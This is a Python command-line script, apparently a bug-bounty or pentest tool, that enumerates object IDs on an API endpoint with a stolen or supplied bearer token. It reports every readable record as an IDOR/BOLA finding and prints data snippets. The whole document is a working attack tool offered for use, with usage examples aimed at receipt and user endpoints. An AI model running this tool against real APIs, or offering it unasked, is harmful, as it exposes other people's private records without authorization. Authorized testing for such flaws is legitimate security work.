import requests
import sys
import time

def scan_bola(target_url, auth_token, start_id, end_id):
    print(f"\n[*] Bhai, starting API BOLA Sniper (IDOR Fuzzer) on -> {target_url}")
    print(f"[*] Testing IDs from {start_id} to {end_id}...")
    print(f"[*] Using Authorization Token: {auth_token[:15]}...\n")
    print("==================================================")

    # Adding the Auth token so the API thinks we are just a normal logged-in user
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Arch Linux x86_64) API-Sniper/1.0",
        "Authorization": f"Bearer {auth_token}",
        "Accept": "application/json"
    }

    # First, let's get a baseline. 
    # If the API returns 401 (Unauthorized) entirely, our token is dead.
    print("[+] Initiating Sniper shots...\n")
    
    success_count = 0

    for object_id in range(start_id, end_id + 1):
        # Replace the 'FUZZ' keyword in the URL with our number
        attack_url = target_url.replace("FUZZ", str(object_id))
        
        try:
            response = requests.get(attack_url, headers=headers, timeout=5)
            status = response.status_code
            length = len(response.text)
            
            # The Logic:
            # 200/201 = We got data!
            # 403 = BOLA prevented (Secure)
            # 404 = Object ID doesn't exist
            
            if status in [200, 201]:
                # We extract a snippet of the response to see if it's real data
                snippet = response.text[:60].replace("\n", "")
                print(f"   [!!!] JACKPOT 🎯 BOLA VULNERABILITY FOUND!")
                print(f"   [!!!] Target ID: {object_id} -> HTTP 200 OK (Data Length: {length})")
                print(f"   [!!!] Data Snippet: {snippet}...")
                print("-" * 50)
                success_count += 1
            elif status == 403:
                print(f"   [-] Blocked ID {object_id} -> HTTP 403 Forbidden (API is Secure)")
            elif status == 404:
                # Silently ignore 404s to keep terminal clean, just show a dot
                print(".", end="", flush=True)
            else:
                 print(f"   [?] Weird Response for ID {object_id} -> HTTP {status}")

            # Small delay to prevent crashing the API
            time.sleep(0.1)

        except requests.exceptions.RequestException:
             print("   [!] Connection Error.")

    print("\n\n==================================================")
    print(f"[*] Sniper Scan Complete!")
    if success_count > 0:
        print(f"[+] Found {success_count} unauthorized objects we could read! Report this BOLA immediately. 💸")
    else:
        print("[-] Target API seems secure against BOLA (or the IDs simply don't exist).")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Expected syntax: python3 bola_sniper.py "http://api.target.com/users/FUZZ" "eyJh..." 1000 1050
    if len(sys.argv) != 5:
        print("Usage: python3 bola_sniper.py <API_URL_WITH_FUZZ> <Auth_Token> <Start_ID> <End_ID>")
        print("Example: python3 bola_sniper.py 'https://api.target.com/v1/receipts/FUZZ' 'eyJhbGci...' 100 150")
        sys.exit(1)
        
    url = sys.argv[1]
    token = sys.argv[2]
    start = int(sys.argv[3])
    end = int(sys.argv[4])
    
    if "FUZZ" not in url:
        print("[-] ERROR: Target URL must contain the word 'FUZZ' where the ID should be injected.")
        sys.exit(1)
        
    scan_bola(url, token, start, end)
